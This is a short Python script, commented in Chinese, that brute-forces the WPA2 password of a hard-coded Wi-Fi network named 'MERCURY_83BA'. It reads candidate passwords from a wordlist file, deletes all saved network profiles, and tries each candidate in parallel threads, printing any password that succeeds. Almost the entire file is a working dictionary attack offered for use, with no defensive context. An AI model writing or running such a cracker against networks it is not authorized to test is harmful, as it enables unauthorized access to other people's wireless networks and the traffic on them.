from pywifi import const
import pywifi
import time, os, threading
from concurrent.futures import ThreadPoolExecutor


def wificonnect(mm_str, wifiname):
    wifi = pywifi.PyWiFi()
    # 选择网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有WiFi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # wifi名称
        profile.ssid = wifiname
        # 加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # wifi的密码
        profile.key = mm_str
        # 网卡开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # 删除所有的WiFi连接文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接WiFi
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已经连接")


# 读取密码
def readPwd(str):
    wifiname = 'MERCURY_83BA'
    while True:
        try:
            # print(myStr)
            bool = wificonnect(str, wifiname)
            if bool:
                print("密码正确" + str)
                break
            else:
                print("密码错误", str)
        except:
            continue


path = r'wifipwd.txt'
with open(path, 'r') as file:
    myStr = [x.strip() for x in file.readlines() if x.strip() != ""]
    # print(myStr)
# 1.创建线程池
pool = ThreadPoolExecutor(max_workers=4)
# 循环指派任务
# 2.指定对应任务和参数
[pool.submit(readPwd, i) for i in myStr]
# 3.关闭线程池
pool.shutdown()
